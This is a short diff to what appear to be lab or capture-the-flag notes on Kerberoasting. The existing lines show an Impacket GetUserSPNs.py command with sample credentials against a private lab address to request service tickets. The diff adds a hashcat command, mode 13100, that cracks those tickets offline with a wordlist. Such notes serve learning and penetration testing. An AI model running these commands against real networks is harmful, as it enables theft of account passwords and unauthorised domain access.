@@ -27,3 +27,10 @@ The TGT can actually be cracked for a password using john or hashcat
 ```
 sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.248.15 -request
 ```
+
+
+crack with hashcat
+
+```
+hashcat -m 13100 -a 0 crackme.txt wordlist.txt 
+```
